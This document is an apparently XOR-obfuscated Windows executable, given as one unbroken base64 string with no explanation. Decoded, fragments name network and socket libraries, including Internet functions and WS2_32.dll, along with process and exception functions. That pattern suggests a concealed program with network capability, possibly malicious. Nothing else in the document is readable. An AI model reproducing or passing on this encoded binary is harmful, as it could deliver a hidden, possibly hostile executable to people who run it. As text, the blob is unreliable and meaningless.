6Ojoxx5WF+jo6OjMHlYX6Ojo6PEeVhcVFxcX5h5WF+jo6OjrHlYXExcXFxAdVhcSFxcXBR1WFxcXFxfbRlYXFxcXF+jo6OgXFxcXGxcXF3FFVxcXFxcXdkVXFxcXFxc/LFYXFBcXFy8sVhfrLVYX8yBWFxcXFxf7RlYXFxcXF+jo6OgXFxcXGxcXF6RFVxcXFxcXdkVXFxcXFxdzLFYXFBcXF2MsVhfrLVYX8yBWFxcXFxcbRVYXFxcXF+jo6OgXFxcXGxcXFxdEVxfp6OjoFxcXF8Po6OgXFxcX6ejo6BcXFxfBQ1cXFxcXF+no6OgXFxcXw+jo6BcXFxfp6OjoFxcXF5xMVxcXFxcX6ejo6BcXFxfP6OjoFxcXF+no6OgXFxcXXUtXFxcXFxfp6OjoFxcXF8Po6OgXFxcX6ejo6BcXFxcMSVcXFxcXF+no6OgXFxcXw+jo6BcXFxfp6OjoFxcXFwN3VxcXFxcX6ejo6BcXFxfD6OjoFxcXF+no6OgXFxcXDXZXFxcXFxfp6OjoFxcXF8Po6OgXFxcX6ejo6BcXFxdzdFcXFxcXF+no6OgXFxcXw+jo6BcXFxfp6OjoFxcXF3ZzVxcXFxcX6ejo6BcXFxfD6OjoFxcXF+no6OgXFxcXCXJXFxcXFxfp6OjoFxcXF8Po6OgXFxcX6ejo6BVlVxcBZVcXFxcXF+no6OgXFxcXw+jo6BcXFxfp6OjoFxcXF1NjVxcXFxcX6ejo6BcXFxef6OjoFxcXF+no6OiuYlcX2mJXFxcXFxfp6OjoFxcXF8Po6OgXFxcX6ejo6BcXFxd/YVcXFxcXF+no6OgXFxcXx+jo6BcXFxfp6OjoFxcXF1aTVxcXFxcX6ejo6BcXFxfb6OjoFxcXF+no6OgXFxcX2pJXFxcXFxcXFxcXjpJXF+no6OgXFxcXx+jo6BcXFxfp6OjoFxcXF7KaVxcXFxcX6ejo6BcXFxfH6OjoFxcXF+no6OgXFxcXRYNXFxcXFxfp6OjoFxcXF8fo6OgXFxcX6ejo6BcXFxcwgVcXFxcXF+no6OgXFxcXx+jo6BcXFxfp6OjoFxcXFzaNVxcXFxcX6ejo6BcXFxfH6OjoFxcXF+no6OgXFxcXM4lXFxcXFxfxilcX54pXF+no6OgXFxcXz+jo6BcXFxfp6Ojo24lXF8KJVxdXFxcXFxcXFxcXFxe5iFcX6Ojo6BcXFxfo6OjoFxcXFxcXFxcXFxcXFhcXFxYXFxcrKVYXNRKEDhUXFxdbKVYXFhcXF0spVhcXFxcXFxcXFxcXFxcWFxcXFxcXF+no6OgXFxcXo+jo6BcXFxfp6OjoFxcXF/G3VxcXFxcXQbdXF0i3Vxfp6OjoFxcXF8Po6OgXFxcX6ejo6Nq1VxfGtVcXFxcXF+no6OgXFxcXz+jo6BcXFxfp6OjocbRXF320VxcXFxcXn4tXFxcXFxcbKFYXFRcXFw8oVhfzIFYXFxcXF7dAVhcXFxcX6Ojo6BcXFxcbFxcXSr9XFxcXFxfp6OjoFxcXF8/o6OgXFxcX6ejo6BcXFxervVcX6ejo6BcXFxfcvVcX6ejo6BcXFxfP6OjoFxcXF+no6OgXFxcXabtXF+no6OgXFxcXnbtXF+no6OgXFxcXz+jo6BcXFxfp6OjoiLlXF7S5VxcXFxcX6ejo6BcXFxfP6OjoFxcXF+no6Oj4uVcX5LlXFxcXFxfp6OjoFxcXF8fo6OgXFxcX6ejo6BcXFxewplcXFxcXF+no6OgXFxcX1+jo6BcXFxfp6OjoFxcXFwmjVxcXFxcX6ejo6BcXFxfD6OjoFxcXF+no6OgXFxcXG6FXFxcXFxfp6OjoFxcXF8Po6OgXFxcX6ejo6BcXFxfb0FcXFxcXF+no6OgXFxcX2+jo6BcXFxfp6OjoFxcXF4ncVxcXFxcX6ejo6BcXFxfD6OjoFxcXF+no6OgXFxcXNdhXFxcXFxfp6OjoFxcXF8/o6OgXFxcX6ejo6NzNVxfJzVcXFxcXF+no6OgXFxcX2+jo6BcXFxfp6OjoFxcXF3bLVxcXFxcX6ejo6BcXFxfD6OjoFxcXF+no6OgXFxcX1clXFxcXFxfp6OjoFxcXF9/o6OgXFxcX6ejo6BcXFxeQ91cXFxcXFxcXFxfUyFcX6ejo6BcXFxfH6OjoFxcXF+no6OgXFxcXSfZXFxcXFxfp6OjoFxcXF9vo6OgXFxcX6ejo6BcXFxe3/VcXFxcXF+no6OgXFxcX1+jo6BcXFxfp6OjoFxcXFzPkVxfPVhYXFxcXFxcXFxdlUxYXHwcWFzNUFhcXFxcXFxcXF6NTFhdDBhYXJ1QWFxcXFxcXFxcX11MWF3cGFhfHVhYXFxcXFxcXFxfJUxYXFwcWFxcXFxcXFxcXFxcXFxcXFxcXFxcX21MWFxcXFxdLVBYXeVQWF2lUFheZVBYXsVQWF6lUFhfZVBYXwVQWF/NUFhflVBYXWVQWFwFTFhc/UxYXIVMWF0VTFhd1UxYXf14WF01eFhcXUxYXL1QWF/tTFhfpUxYXHVIWFzVSFhctUhYXUVIWF0VSFhd3UhYXYVIWF5FSFheBUhYXsVIWF69SFhfZUhYX91IWF+VSFhcVURYXPVEWFy9RFhdHURYXe1EWF51RFheJURYXpVEWF9FRFhf1URYX41EWFxdQFhcBUBYXMVAWFy9QFhdZUBYXTVAWF3FQFhdjUBYXlVAWF5tQFhezUBYXr1AWF99QFhf3UBYX+VAWF+tQFhcFXxYXCV8WFz9fFhcjXxYXUV8WF0FfFhd1XxYXb18WF4VfFhe7XxYX0V8WF8tfFhfhXxYXEV4WFw1eFhc9XhYXL14WF19eFhdvXhYXFxcXF4FTFheXUxYXFxcXF2QXF5cXFxcXnhRYYmNnYmNTcnVicERjZX55cFYXF3UWUWVyclt+dWV2ZW4XUhVQcmNHZXh0VnNzZXJkZBcXKxRbeHZzW351ZXZlblYXFxUVUHJjW3ZkY1JlZXhlFxcyFlF+e3JDfnpyQ3hEbmRjcnpDfnpyFxeqE0RuZGNyekN+enJDeFF+e3JDfnpyFxcUFVByY1t4dHZ7Q356chcXpRNEe3JyZxfEF1Nye3JjclF+e3JWF0UXVHt4ZHJfdnlze3IX5xZQcmNRfntyRH5tchfuE0B2fmNReGVEfnlwe3JYdX1ydGMXsxdUZXJ2Y3JHZXh0cmRkVhcXnxdUZXJ2Y3JRfntyVhcLFlJvZ3Z5c1J5YX5leHl6cnljRGNlfnlwZFYXhBVQcmNDfnR8VHhieWMXF4wXVGVydmNyWmJjcm9WFxdcUkVZUlskJTlze3sXF7MXXnljcmV5cmNEcmNUeHh8fnJWFxevF155Y3JleXJjQ356clFleHpEbmRjcnpDfnpyFxdAXlleWVJDOXN7exdARCVIJCU5c3t7FxcoF1ByY1ZzdmdjcmVkXnlxeBdeR19bR1ZHXjlTW1sXF6YURXZ+ZHJSb3RyZ2N+eHkXFw8TRWN7QnlgfnlzF/kXUnljcmVUZX5jfnR2e0RydGN+eHkXFy4UW3J2YXJUZX5jfnR2e0RydGN+eHkXF9gVX3J2Z1FlcnIXF9wVX3J2Z1Z7e3h0Fw0WUm9+Y0N/ZXJ2cxcX0hZQcmNUYmVlcnljQ39lcnZzXnMXF6IXVGVydmNyQ39lcnZzFxf9F1J5dHhzckd4fnljcmUX3RdTcnR4c3JHeH55Y3JlF5EWUHJjVHh6enZ5c1t+eXJWF8QVX3J2Z0RyY155cXhlenZjfnh5Fxd0FVByY0RjdmVjYmdeeXF4QBd4E0RyY192eXN7clR4YnljFxdzFVByY0Rjc192eXN7chcX9BVeeX5jfnZ7fm1yVGV+Y350dntEcnRjfnh5VnlzRGd+eVR4YnljF+QWUHJjUX57ckNuZ3IXxhdTcntyY3JUZX5jfnR2e0RydGN+eHkXxBNCeX92eXN7cnNSb3RyZ2N+eHlRfntjcmUXF7ITRHJjQnl/dnlze3JzUm90cmdjfnh5UX57Y3JlFxcUXmRTcnVicHByZUdlcmRyeWMX1xNDcmV6fnl2Y3JHZXh0cmRkFxfXFlByY1RiZWVyeWNHZXh0cmRkFxMUXmRHZXh0cmRkeGVRcnZjYmVyR2VyZHJ5YxdxE0RyY1F+e3JHeH55Y3JlFxcyEkBlfmNyUX57chcGEkB+c3JUf3ZlQ3haYntjflVuY3IXjRZQcmNUeHlkeHtyVEcXF7sWUHJjVHh5ZHh7clp4c3IXF3AUWmJ7Y35VbmNyQ3hAfnNyVH92ZRfXFEVydnNRfntyFxfSE0N7ZFZ7e3h0FxfQE0N7ZFByY0F2e2JyF98TQ3tkRHJjQXZ7YnIX0RNDe2RRZXJyF/gVXnljcmV7eHR8cnNeeXRlcnpyeWMXFw8VUHJjWnhzYntyX3Z5c3tyQBcXZBNEcmNbdmRjUmVleGUXF/wVXnljcmV7eHR8cnNTcnRlcnpyeWMXFw4WUm9+Y0dleHRyZGQX2hVfcnZnVGVydmNyFxcDFVByY1p4c2J7clF+e3JZdnpyQBcXZRZQcmNUR155cXgXfxZQcmNWVEcXFyAVUHJjWFJaVEcXFx0UXmRBdnt+c1R4c3JHdnByFzoUW1RadmdEY2V+eXBAFxfDFV9ydmdEfm1yFxcEFVByY1p4c2J7clF+e3JZdnpyVhcXdhZRZXJyUnlhfmV4eXpyeWNEY2V+eXBkQBfNFlByY1J5YX5leHl6cnljRGNlfnlwZEAXF7AURmJyZW5HcmVxeGV6dnl0clR4YnljcmUX1hZQcmNUYmVlcnljR2V4dHJkZF5zF24VUHJjRG5kY3J6Q356clZkUX57ckN+enIXkBNEcmNEY3Nfdnlze3IXF0AWUXtiZH9RfntyVWJxcXJlZBcXMxJAZX5jclR4eWR4e3JAF8UVX3J2Z0VyVnt7eHQXKBRbeHZzW351ZXZlbkAXF34VUHJjRGNlfnlwQ25nckAXF5gXVGVydmNyUX57ckAXRBNEcmNSeXNYcVF+e3IXF10VUHJjR2V4dHJkZF9ydmcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxdXA1YXFxcXFzlfFxdXA1YXFxcXFzkoVkF1dnNIdnt7eHRXZGNzV1cXVwNWFxcXFxc5KFZBcm90cmdjfnh5V2Rjc1dXF1cDVhcXFxcXOShWQVtNVkVeV1cXDyDe05Nwy1g01fmtKhALj6LxWVrjJDV83bSJJephVOToJFLgTgbItsXurqLejbR55r0HbaHcKV8/Rl3ZjX+6n7v17WA+TOCqXk+RlP3rjIVYKIKecUf6VENwwhTCoVjlLRK1pxvHAFzB5e/Nqm5vkWQjjdpv9cIALVL4zsTQ1PM5KCkjlwWXSYY8do+L1djirSoH70yjtJNqLuMXGHxXepTO+s8TfjF5z0hpmCmKVs6dXyzd6q54NaEAB0lnbozoQlBqA6cvLVyjrS4g4uiEnIk0S735hdCZOSjT6rOPfTBLwZcbIZ6tSBcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxgXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcYFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXGBcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxgXFxcXFxcXVwNWFxcXFxc5KFZBQlleSEVUI1dXFxcXVwNWFxcXFxc5KFZBe3hwfnRIcmVleGVXZGNzV1cXFxdXA1YXFxcXFzkoVkF7cnlwY39IcmVleGVXZGNzV1cXF1cDVhcXFxcXOShWQXhiY0h4cUhldnlwcldkY3NXVxcXVwNWFxcXFxc5KFZBY25nckh+eXF4V1cXFxcXFxcXFxcXFxcXWfFXrKYOqFMXFxcXFxcXF5dnVhcXFxcXl2dWFxYWFxcXFxcXFxcXFxcHFxcXFxcXFxcXFxcXFxcXFxcXFRcXFxYXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcVFxcXFRcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcVFxcXFxcXFxcXFxcXFxcX6Ojo6JcdFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxYXFxcBFxcXFRcXFxUXFxcUFxcXFRcXFxMXFxcPFxcXEhcXFxoXFxcRFxcXHhcXFxAXFxcbFxcXHxcXFxsXFxceFxcXGxcXFx0XFxcQFxcXHBcXFx8XFxcbFxcXARcXFxoXFxcBFxcXGBcXFxUXFxcHFxcXGhcXFwYXFxcFFxcXBRcXFxUXFxc2FxcXGhcXFyIXFxcVFxcXVhcXFxoXFxdUFxcXFRcXF0cXFxcGFxcXRRcXFxoXFxdEFxcXGhcXF0AXFxcBFxcXThcXFxwXFxd7FxcXGhcXF3oXFxc3FxcXZxcXFwsXFxdlFxcXHhcXFxEXFxcBFxcXlxcXFx0XFxeWFxcXHRcXF5UXFxceFxcXlBcXFwEXFxeTFxcXGhcXF4YXFxc+FxcXiRcXFxoXFxe2FxcXFRcXF7MXFxccFxcXsBcXFxoXFxegFxcXBhcXF9kXFxcVFxcXwBcXFxwXFxcPEBcXGxcXFxsXFxcfFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYVFRUVFRUVFRUVFRUVFRUVFBQUFBQUFBQXFxcXFxcXF1cDVhcXFxcXOShWQXV2c0hyb3RyZ2N+eHlXZGNzV1cX6Ojo6Ojo6OgXFxcXFxcXFxcXFxcWFxcXFxcXFxYXFxcXFxcXFxcXFxcXFxcWFxcXFxcXFxYXFxcXFxcXFxcXFxcXFxcWFxcXFxcXFxYXFxcXFxcXFhcXFxcXFxcXFxcXFxcXFxYXFxcXFxcXFxcXFxcXFxcWFxcXFxcXFxYXFxcXFxcXFhcXFxcXFxcXFxcXFxcXFxYXFxcXFxcXFhcXFxcXFxcWFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFysCVhc7AlYXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHFxcXFxcXNzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3NzcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxd2dXRzcnFwf359fHt6eXhnZmVkY2JhYG9ubRcXFxcXF1ZVVFNSUVBfXl1cW1pZWEdGRURDQkFAT05NFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHFxcXFxcXNzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3NzcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXdnV0c3JxcH9+fXx7enl4Z2ZlZGNiYWBvbm0XFxcXFxdWVVRTUlFQX15dXFtaWVhHRkVEQ0JBQE9OTRcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxfvT1YXFhUTH7MUFxd3lW6VNhcXFxcXFxexyBcXFxcXF7ayFxcXFxcXloj36xcXFxdXaZfrFxcXF78UFxfWtM20NxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXlukXFxcXFxdX6RcXFxcXF6IUFxfWtM20NxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXlukXFxcXFxdW6RcXFxcXF6EUFxfYtfO1DRfytf+1TBcXFxcXFxcXFxcXFxcXFxcXlukXFxcXFxdXabbpFxcXF0YSFxdGzUnNNxdIzX3NJRcXFxcXFxcXFxcXFxcXFxcXlsTPyffuFxcmaZbpFxcXF+no6OhUFxcX8zVWF/c1VhfLNVYXzzVWF8M1VhfHNVYX2zVWF9M1VherNVYXozVWF781VheLNVYXgzVWF581VheTNVYXlzVWF2s1VhdvNVYXYzVWF2c1Vhd7NVYXfzVWF3M1Vhd3NVYXSzVWF081VhdHNVYXUzVWFys1VhcjNVYXYzVWFzs1VhczNVYXCzVWFwc1VhcfNVYX6zZWF+c2Vhf7NlYX/zZWF8s2VhffNlYXqzZWFx4TFxcWFxcXFxcXF6M2Vhe7NlYXszZWF4s2VheDNlYXmzZWF5M2VhdjNlYXczZWF0M2VhdXNlYXOzZWFws2VhcfNlYXFzZWF+83VhfnN1YX/zdWF/c3VhfPN1YXxzdWF983VhfXN1YXrzdWF6c3Vhe/N1YXjzdWF5M3VhdvN1YXezdWF/c3Vhd3N1YXQzdWF1M3VhcnN1YXNzdWFxs3VhfvCFYX5whWF/8IVhfDCFYXuwhWF48IVhcXFxcXFhcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFwtJVhcXFxcXFxcXFxcXFxcLSVYXFxcXFxcXFxcXFxcXC0lWFxcXFxcXFxcXFxcXFwtJVhcXFxcXFxcXFxcXFxcLSVYXFxcXFxcXFxcXFxcXFhcXFxYXFxcXFxcXFxcXFxcXFxevd1YXFxcXFxcXFxcHOlYXjyZWFw8kVhc3SVYXn0hWFwM4VhcX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Lc0t/C3jLe4tFSwdLAwsMyw+LCUsLSxcLEMsTix3LHMsfiwXBxYXlxcXF3smZyZjJm8mkyafJpsmhyaDJrcmsyavJqsm1ybPJssmKyVXJe8k6yQXIxMjHyMbIwcjAyMPIysjVyNTI18jWyODI48jiyO3I7MjvyM7KSMpKylTKVspQylLKXMpeyljKWspkymbKYMpiymzKbspoymrKdMp2ynDKRc3FhfbFxcXpy6jLq8uqy7XLtMu3y7bLscuwy7PLssu9y7zLv8u+y7nLuMu7y7rLhctEy0fLRstBy0DLQ8tCy03LTMtPy07LSctIy0vLSstVy1TLV8tWy1HLUMtTy1LLXctcy1/LXstZy1jLW8tay2XLZMtny2bLYctgy2PLYstty2zLb8tuy2nLaMtry2rLdct0y3fLdstxy3DLc8tyy33LfMt/y37Lect4y3vLestFywTLB8sGywHLAMsDywLLDcsMyw/LDssJywXFxcnFhefFhcXcyN/I2sjlyOHI4MjjyO3I68jqyPDI/Mj/yPrIxciByIDIgsiIyJTIl8iTyJLInMiayKbIocityKzIr8ipyLfIs8iyyL7Iuci4yLvIhchDyE/ITshKyFXIVMhXyFHIX8hbyFrIZshhyGPIach1yHTIcMhzyH/Ifsh5yHvIQcgkyCbIIMgpyCvINcg0yDbIPcg/yDrIBsvCy9fL0cvYy+fL4cvjy+zL9Mv2y/PL+8vEy4zLjsuLy5PLncufy5nLmsuty7XLt8uxy7PLvcu+y4bLQMtCy0zLTstIy0rLVMtRy1nLW8tky2/Ld8txy3PLfct/y3nLe8tFywDLAssMyw7LCcsIywrLEcsTyx3LH8seyxnLG8smyy/LN8s/ywfKz8rXyt/K58rvyvTK98r/ysTKh8qPypfKn8qYyqHKqcqxyrnKgcpDykLKSMpLylfKXspbymXKacprymrKcMpzynjKe8pFygfKAcoAygLKCcoRyhLKG8okyiLKLcoqyjXKPcoF1cWFzMXFxcXJzcnVyd3J5cniye3J9cn9ycXJhsmPy